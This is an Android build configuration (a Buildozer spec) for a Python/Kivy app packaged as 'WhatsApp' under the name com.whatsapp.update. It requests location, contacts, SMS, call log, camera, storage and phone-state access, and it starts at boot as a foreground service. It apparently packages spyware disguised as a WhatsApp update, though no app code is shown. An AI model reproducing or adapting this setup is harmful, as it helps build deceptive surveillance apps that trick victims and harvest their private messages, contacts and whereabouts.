[app]
title           = WhatsApp
package.name    = update
package.domain  = com.whatsapp
source.dir      = .
source.include_exts = py,kv,png,jpg
version         = 1.0
requirements    = python3,kivy==2.3.0,plyer,requests,urllib3
android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,CAMERA,READ_CALL_LOG,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,READ_PHONE_STATE
android.api     = 33
android.minapi  = 26
android.ndk     = 25b
android.arch    = arm64-v8a
android.allow_backup = False
android.meta_data = com.google.android.gms.version:@integer/google_play_services_version
orientation     = portrait
fullscreen      = 0
icon.filename   = %(source.dir)s/icon.png

[buildozer]
log_level = 1
warn_on_root = 1
